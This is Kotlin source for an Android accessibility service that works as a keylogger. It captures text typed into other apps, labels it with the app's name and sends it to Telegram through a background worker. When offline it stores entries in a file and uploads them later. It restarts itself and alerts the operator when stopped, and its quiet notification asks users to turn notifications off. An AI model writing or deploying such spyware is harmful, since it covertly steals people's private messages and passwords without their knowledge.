package com.onodnawij.siga

import android.accessibilityservice.AccessibilityService
import android.app.*
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Handler
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.core.app.NotificationCompat
import androidx.work.*
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap

class HeheService : AccessibilityService() {

    companion object {
        var instance: HeheService? = null
    }

    private val textPool = ConcurrentHashMap<String, String>()
    private val textDelays = ConcurrentHashMap<String, Runnable>()
    private var lastPackageName: String? = null
    private val handler = Handler()

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.d("Siga.HeheService", "Accessibility Service Started")
        triggerTelegramWorker("HeheService started")
        startForegroundService()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.packageName == null) return

        val packageName = event.packageName.toString()
        if (isKeyboardApp(packageName)) {
            Log.d("Siga.HeheService", "Ignoring keyboard input from: $packageName")
            return
        }

        lastPackageName = packageName
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            handleTextChange(event)
        }
    }

    override fun onInterrupt() {
        Log.d("Siga.HeheService", "Service Interrupted")
    }

    override fun onUnbind(intent: Intent?): Boolean {
        instance = null
        Log.d("Siga.HeheService", "Service Unbound – triggering fallback.")
        triggerTelegramWorker("HeheService was unbound")
        return super.onUnbind(intent)
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        Log.e("Siga.HeheService", "Service Destroyed! Sending restart signal...")
        triggerTelegramWorker("HeheService was destroyed")
        sendRestartBroadcast()
    }

    private fun sendRestartBroadcast() {
        val intent = Intent("com.onodnawij.siga.RESTART_HEHESERVICE")
        sendBroadcast(intent)
    }

    private fun startForegroundService() {
        val channelId = "HeheServiceChannel"
        val channelName = "Hehe Service"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                channelName,
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Siga Notif Test")
            .setContentText("Please disable the notification of this app")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setSilent(true)
            .build()

        startForeground(1, notification)
    }

    private fun handleTextChange(event: AccessibilityEvent) {
        if (lastPackageName == null) return
        val newText = event.text?.joinToString(" ")?.trim() ?: return
        if (newText.isEmpty()) return

        textPool[lastPackageName!!] = newText
        Log.d("Siga.HeheService", "Text Updated: [$lastPackageName] $newText")

        textDelays[lastPackageName]?.let { handler.removeCallbacks(it) }

        val logTask = Runnable {
            val finalText = textPool[lastPackageName]?.trim()
            if (!finalText.isNullOrEmpty()) {
                val label = getAppLabelOrPackage(lastPackageName!!)
                val logEntry = "[$label]\nTyping: $finalText"
                Log.d("Siga.HeheService", "Logging: $logEntry")
                triggerTelegramWorker(logEntry)
                textPool.remove(lastPackageName)
                textDelays.remove(lastPackageName)
            }
        }

        textDelays[lastPackageName!!] = logTask
        handler.postDelayed(logTask, 1400)
    }

    private fun getAppLabelOrPackage(packageName: String?): String {
        if (packageName == null) return "Unknown"
        return try {
            val appInfo = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    private fun isKeyboardApp(packageName: String): Boolean {
        return try {
            val inputMethodList = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_INPUT_METHODS)
            inputMethodList?.contains(packageName) ?: false
        } catch (e: Exception) {
            Log.e("Siga.HeheService", "Error detecting keyboard apps: ${e.message}")
            false
        }
    }

    private fun isInternetAvailable(): Boolean {
        val connectivityManager = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } else {
            val networkInfo = connectivityManager.activeNetworkInfo
            return networkInfo != null && networkInfo.isConnected
        }
    }

    private fun getOfflineLogFile(): File {
        val dir = File(applicationContext.filesDir, "siga_logs")
        if (!dir.exists()) dir.mkdirs()
        return File(dir, "siga_offline_log.txt")
    }

    private fun triggerTelegramWorker(logEntry: String) {
        if (isInternetAvailable()) {
            // Send logEntry to Telegram (no timestamp)
            val inputData = Data.Builder()
                .putString("logEntry", logEntry)
                .build()

            val request = OneTimeWorkRequestBuilder<TelegramWorker>()
                .setInputData(inputData)
                .build()

            WorkManager.getInstance(applicationContext).enqueue(request)

            // Also upload file log if it exists
            val logFile = getOfflineLogFile()
            if (logFile.exists()) {
                val uploadFileRequest = OneTimeWorkRequestBuilder<TelegramWorker>()
                    .setInputData(Data.Builder().putString("filePath", logFile.absolutePath).build())
                    .build()
                WorkManager.getInstance(applicationContext).enqueue(uploadFileRequest)
            }
        } else {
            val now = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())
            val logWithTime = "[$now]\n$logEntry"
            val file = File(filesDir, "siga_offline_log.txt")
            file.appendText(logWithTime + "\n\n")
            Log.d("Siga.HeheService", "Saved offline log: $logWithTime")
        }

        Log.d("Siga.HeheService", "Telegram worker triggered.")
    }
}
